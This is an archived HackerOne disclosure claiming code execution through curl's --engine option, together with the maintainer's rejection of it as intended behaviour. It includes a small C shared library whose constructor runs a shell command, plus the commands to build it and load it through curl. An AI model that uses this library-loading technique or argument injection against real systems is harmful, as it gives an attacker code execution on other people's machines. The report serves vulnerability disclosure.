---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
  - trigger/file-upload
  - trigger/social-engineering
  - fix/file-validation
substate: "not-applicable"
weakness: "Code Injection"
enriched: true
body: true
date: 2025-08-10
submitted: 2025-08-10T18:26:22.967Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/curl|curl]]"
reporter: "z1andr4g0n"
source: "https://hackerone.com/reports/3293801"
title: "Title: Remote Code Execution (RCE) via Arbitrary Library Loading in `--engine` option"
---
# Title: Remote Code Execution (RCE) via Arbitrary Library Loading in `--engine` option

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 13 | **Program:** curl | **Disclosed:** 2025-08-10

- Report: [https://hackerone.com/reports/3293801](https://hackerone.com/reports/3293801)
- CWE: Code Injection
- Submitted: 2025-08-10T18:26:22.967Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#### Summary:
The `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.

An attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an engine.

This leads to direct RCE if an attacker can influence the arguments passed to a `curl` command, a common scenario in web application backends, CI/CD pipelines, and other automated scripts.

*(Statement as per disclosure policy: This vulnerability was discovered and verified by me. An AI assistant was used to help structure and draft this report based on my findings and proof-of-concept.)*

#### Affected version:
I reproduced this on the following version, but it likely affects all versions that support the `--engine` option on POSIX systems with GCC/Clang compiled binaries.
```
┌──(Dr4g0n㉿DESKTOP-2CIPGDF)-[~]
└─$ curl -V
curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 nghttp3/1.8.0 librtmp/2.3 OpenLDAP/2.6.9
Release-Date: 2025-04-02, security patched: 8.13.0-5
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```
#### Steps To Reproduce:
These steps will demonstrate direct code execution on a WSL/Linux system.

1.  **Step 1: Create the malicious payload.**
    Save the following C code as `evil_engine.c`. This code will execute `id > /tmp/RCE_VIA_ENGINE` the moment the library is loaded.

    ```c
    #include <stdlib.h>

    // This constructor function is executed automatically by the dynamic loader
    // as soon as the library is loaded into the process address space.
    __attribute__((constructor))
    static void rce_init(void) {
        system("id > /tmp/RCE_VIA_ENGINE");
    }
    ```

2.  **Step 2: Compile the payload into a shared library.**
    Use `gcc` to compile the C code into a shared object (`.so`) file.

    ```bash
    gcc -fPIC -shared -o evil_engine.so evil_engine.c
    ```

3.  **Step 3: Prepare for verification.**
    Ensure the proof file does not exist before the attack.

    ```bash
    rm -f /tmp/RCE_VIA_ENGINE
    ```

4.  **Step 4: Execute `curl` with the malicious engine.**
    Run any `curl` command, but use the `--engine` option to point to our malicious library. Note that we must provide an absolute path.

    ```bash
    curl --engine `pwd`/evil_engine.so https://example.com
    ```
    *You will see an error message like `curl: (53) SSL Engine '...' not found`. This error is expected and irrelevant, as it occurs **after** our malicious code has already been executed by the constructor.*

5.  **Step 5: Verify Code Execution.**
    Check the contents of the proof file.

    ```bash
    cat /tmp/RCE_VIA_ENGINE
    ```
    The command will output the result of the `id` command, confirming that arbitrary code was executed successfully as the user who ran `curl`.

#### Supporting Material/References:
I have recorded a full video of the Proof of Concept: `PoC.mp4`

## Impact

The security impact is **direct and critical Remote Code Execution**.

An attacker who can control or influence the arguments passed to a `curl` command can achieve RCE on the underlying system. This completely bypasses any application-level security.

Common attack scenarios include:
*   **Web Application Backends:** A web service that allows users to provide options for a `curl` command (e.g., in a "website checker" or "webhook tester" feature) would be vulnerable. An attacker could inject `--engine /path/to/payload.so` if they can also upload a file.
*   **CI/CD Pipelines & Scripts:** Automated scripts that build `curl` commands using variables from external, untrusted sources (like commit messages or API responses) could be tricked into loading a malicious engine.
*   **Social Engineering:** A developer or system administrator could be tricked into running a seemingly benign diagnostic command provided by an attacker, which includes the malicious `--engine` flag.

The vulnerability stems from the `--engine` feature trusting a user-provided path without any validation or restriction to a secure, system-defined directory for crypto engines. This effectively turns the feature into a "load-and-run" primitive for arbitrary shared libraries.

## Timeline

- **Report Filed**
- **2025-08-10** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-08-10** @bagder: I claim this is curl working as intended.

The OpenSSL engine system is their legacy system that is being replaced by "providers". Still a modern OpenSSL can be built with support for both. You can also opt to build OpenSSL without support for either.

curl supports loading a provided engine/provider into OpenSSL and then that will be used for crypto/certificate functionality.

An engine/provider is native code. A shared library loaded by OpenSSL and executed. That's what they do. That's how they work. It is a security problem if you let an attacker install an engine for a user to run, as that can execute code with the same rights as the user. That's not something curl can prevent.
- **Report Not Applicable**
- **Agreed On Going Public**
- **2025-08-10** @z1andr4g0n: You're absolutely right, from a purely technical standpoint, `curl` is doing exactly what it was designed to do: providing a clean pass-through to OpenSSL's engine loading feature. It's "working as intended".

But the vulnerability I'm reporting isn't a bug in the *implementation*, it's a critical flaw in the *design of the command-line interface itself*. The problem is that `curl`, a tool used in countless automated, trusted environments, exposes this incredibly powerful, low-level functionality directly to user-supplied arguments without any safety rails.

Your argument rests on a threat model where an attacker must "install an engine for a user to run". That assumes the attacker already has significant filesystem access, at which point it's already game over.

The real, and much scarier, threat model is **Argument Injection**.

Think about the millions of places `curl` is executed from scripts: web application backends, CI/CD pipelines, automated testers, etc. In these scenarios, an attacker doesn't need to *install* anything. They just need the ability to control one of the arguments passed to `curl`. If they can inject `"--engine /tmp/payload.so"` (pointing to a file they uploaded via a completely separate feature), they achieve instant RCE.

This is the classic `include($_GET['page']);` problem from the PHP world. The `include` function is "working as intended", but exposing it raw to user input is a textbook critical vulnerability. `curl` is doing the exact same thing here with OpenSSL's dynamic library loading.

The `curl` project already understands this principle of protecting its users from dangerous features. The man page for `-J` (`--remote-header-name`) contains a **specific security warning** about the risk of a server providing a malicious filename. The `--engine` option is a thousand times more dangerous—it's not just creating a file, it's executing native code—yet the documentation gives no hint of this risk. It simply says it takes a `<name>`, while in reality, it accepts a full, arbitrary file path.

This isn't about whether OpenSSL's feature is dangerous. It is. It's about whether `curl`, as a ubiquitous and trusted tool, should be handing users a loaded gun without any safety on.

I strongly believe this should be reconsidered as a critical vulnerability in `curl`'s interface design. At a minimum, this feature needs a giant, flashing red warning in the docs. Ideally, it should be restricted to only load engines from a trusted, system-defined path, breaking this RCE vector completely.

Thanks for your time and for creating such an incredible tool. I'm looking forward to your thoughts.
- **2025-08-10** @bagder: I strongly disagree.

curl simply cannot protect itself from loading a backdoored engine. You have failed as a sysadmin when you allowed that engine to get installed. THAT is the problem.
- **Manually Disclosed**
- **2025-08-10** @bagder: If you want to discuss how we can improve curl in this and other regards, feel free to take that discussion to an open curl discussion forum. Not here. We love improving curl!
